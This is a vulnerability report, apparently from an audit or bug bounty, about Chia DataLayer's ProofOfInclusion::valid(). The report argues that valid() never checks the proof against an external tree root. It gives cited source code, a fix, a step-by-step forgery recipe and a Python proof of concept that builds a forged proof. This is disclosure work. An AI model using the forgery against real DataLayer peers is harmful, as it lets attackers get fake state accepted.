### Title
`ProofOfInclusion::valid()` Does Not Validate Against an External Tree Root, Enabling Forged Inclusion Proofs — (`File: crates/chia-datalayer/src/merkle/proof_of_inclusion.rs`)

### Summary

`ProofOfInclusion::valid()` in the DataLayer crate only verifies internal hash-chain consistency within the proof itself. It never checks the computed root against any externally-known, authoritative tree root. The final equality check in `valid()` is a tautology: it compares `existing_hash` against `self.root_hash()`, but `root_hash()` simply returns `last.combined_hash` — the same value `existing_hash` was just assigned. An attacker can craft a `ProofOfInclusion` with an arbitrary `node_hash` (the leaf they wish to "prove" is included) and internally-consistent layers, and `valid()` will return `true` for any such forged proof.

### Finding Description

**Root cause — `valid()` is self-referential:** [1](#0-0) 

```rust
pub fn root_hash(&self) -> Hash {
    if let Some(last) = self.layers.last() {
        last.combined_hash   // ← comes from the proof itself
    } else {
        self.node_hash
    }
}

pub fn valid(&self) -> bool {
    let mut existing_hash = self.node_hash;
    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash, layer.other_hash_side, &layer.other_hash,
        );
        if calculated_hash != layer.combined_hash { return false; }
        existing_hash = calculated_hash;
    }
    existing_hash == self.root_hash()   // ← always true if loop passes
}
```

After the loop, `existing_hash` equals the last `calculated_hash`, which was just checked to equal `layer.combined_hash`. `self.root_hash()` returns that same `last.combined_hash`. The final comparison is therefore always `true` whenever the loop completes without returning `false`. No external root is ever consulted.

**Contrast with the consensus Merkle set**, which correctly validates against an external root: [2](#0-1) 

```rust
pub fn validate_merkle_proof(proof: &[u8], item: &[u8; 32], root: &[u8; 32]) -> Result<bool, SetError> {
    let tree = MerkleSet::from_proof(proof)?;
    if tree.get_root() != *root { return Err(SetError); }  // ← external root checked
    Ok(tree.generate_proof(item)?.0)
}
```

The DataLayer `ProofOfInclusion::valid()` has no equivalent parameter or check.

**Attacker-controlled entry path:**

`ProofOfInclusion` is a `Streamable` type exposed via Python bindings with `from_bytes` and `from_json_dict` deserializers: [3](#0-2) 

A DataLayer peer can send a serialized `ProofOfInclusion` over the network. The receiving node deserializes it and calls `proof.valid()` to decide whether to accept the claimed state. Because `valid()` never checks against the actual tree root stored locally, the attacker's forged proof passes.

**Exploit construction:**

1. Choose any target `node_hash` (the leaf the attacker wants to falsely prove is included).
2. Choose any `other_hash` values for each layer.
3. Compute each `combined_hash` correctly: `combined_hash_i = calculate_internal_hash(prev_hash, side, other_hash_i)`.
4. Serialize and send the `ProofOfInclusion`.
5. Receiver calls `valid()` → returns `true`.

The attacker controls the final "root" (the last `combined_hash`) entirely; it need not match any real tree.

### Impact Explanation

An attacker can forge a `ProofOfInclusion` claiming any key-value pair is present in any DataLayer tree. Any DataLayer client that relies on `proof.valid()` as its sole verification step will accept the forged state as authentic. This lets untrusted input prove invalid DataLayer state — matching the allowed High impact: **DataLayer Merkle proof/blob/delta logic accepts forged inclusion/exclusion or lets untrusted input prove invalid state.**

### Likelihood Explanation

The Python API exposes `ProofOfInclusion` as a first-class streamable object with `from_bytes`/`from_json_dict`. DataLayer peers routinely exchange proofs. Any consumer that calls `proof.valid()` without separately comparing `proof.root_hash()` against a locally-trusted root is vulnerable. The `valid()` method name strongly implies it is a complete verification, making silent misuse highly probable.

### Recommendation

`valid()` must accept an external, authoritative root hash parameter and compare the computed root against it:

```rust
pub fn valid_against_root(&self, expected_root: &Hash) -> bool {
    let mut existing_hash = self.node_hash;
    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash, layer.other_hash_side, &layer.other_hash,
        );
        if calculated_hash != layer.combined_hash { return false; }
        existing_hash = calculated_hash;
    }
    &existing_hash == expected_root   // ← compare against caller-supplied root
}
```

Alternatively, deprecate the no-argument `valid()` or make it always return `false` to force callers to use the root-checking variant. The Python binding should mirror this change.

### Proof of Concept

```python
from chia_rs.datalayer import ProofOfInclusion, ProofOfInclusionLayer, MerkleBlob, KeyId, ValueId
from chia_rs import bytes32
import hashlib

# Arbitrary target leaf we want to "prove" is included
target_leaf = bytes32(b'\xAB' * 32)

# Build a single-layer proof: combined_hash = internal_hash(target_leaf, other_hash)
other_hash = bytes32(b'\xCD' * 32)
# calculate_internal_hash with other_hash on the Right side:
# sha256(b'\x02' + target_leaf + other_hash)
h = hashlib.sha256(b'\x02' + bytes(target_leaf) + bytes(other_hash)).digest()
combined_hash = bytes32(h)

layer = ProofOfInclusionLayer(
    other_hash_side=1,   # Right
    other_hash=other_hash,
    combined_hash=combined_hash,
)
forged_proof = ProofOfInclusion(node_hash=target_leaf, layers=[layer])

# valid() returns True even though no real MerkleBlob contains target_leaf
assert forged_proof.valid(), "Forged proof accepted!"
# root_hash() is the attacker-chosen combined_hash, not any real tree root
print("Forged root:", forged_proof.root_hash().hex())
```

`valid()` returns `True` for a proof the attacker constructed from scratch, with no real tree involved. [4](#0-3) [5](#0-4) [2](#0-1) [3](#0-2)

### Citations

**File:** crates/chia-datalayer/src/merkle/proof_of_inclusion.rs (L31-58)
```rust
impl ProofOfInclusion {
    pub fn root_hash(&self) -> Hash {
        if let Some(last) = self.layers.last() {
            last.combined_hash
        } else {
            self.node_hash
        }
    }

    pub fn valid(&self) -> bool {
        let mut existing_hash = self.node_hash;

        for layer in &self.layers {
            let calculated_hash = crate::calculate_internal_hash(
                &existing_hash,
                layer.other_hash_side,
                &layer.other_hash,
            );

            if calculated_hash != layer.combined_hash {
                return false;
            }

            existing_hash = calculated_hash;
        }

        existing_hash == self.root_hash()
    }
```

**File:** crates/chia-consensus/src/merkle_tree.rs (L334-344)
```rust
pub fn validate_merkle_proof(
    proof: &[u8],
    item: &[u8; 32],
    root: &[u8; 32],
) -> Result<bool, SetError> {
    let tree = MerkleSet::from_proof(proof)?;
    if tree.get_root() != *root {
        return Err(SetError);
    }
    Ok(tree.generate_proof(item)?.0)
}
```

**File:** wheel/python/chia_rs/datalayer.pyi (L236-266)
```text
@final
class ProofOfInclusion:
    node_hash: bytes32
    # children before parents
    layers: list[ProofOfInclusionLayer]

    def root_hash(self) -> bytes32: ...
    def valid(self) -> bool: ...

    def __new__(cls, node_hash: bytes32, layers: list[ProofOfInclusionLayer]) -> ProofOfInclusion: ...

    # TODO: generate
    def __hash__(self) -> int: ...
    def __repr__(self) -> str: ...
    def __deepcopy__(self, memo: object) -> Self: ...
    def __copy__(self) -> Self: ...
    @classmethod
    def from_bytes(cls, blob: bytes) -> Self: ...
    @classmethod
    def from_bytes_unchecked(cls, blob: bytes) -> Self: ...
    @classmethod
    def parse_rust(cls, blob: ReadableBuffer, trusted: bool = False) -> tuple[Self, int]: ...
    def to_bytes(self) -> bytes: ...
    def __bytes__(self) -> bytes: ...
    def stream_to_bytes(self) -> bytes: ...
    def get_hash(self) -> bytes32: ...
    def to_json_dict(self) -> dict[str, Any]: ...
    @classmethod
    def from_json_dict(cls, json_dict: dict[str, Any]) -> Self: ...
    def replace(self, *, node_hash: bytes32 = ..., layers: list[ProofOfInclusionLayer] = ...) -> Self: ...
    def truncate(self, field: str, length: int) -> None: ...
```
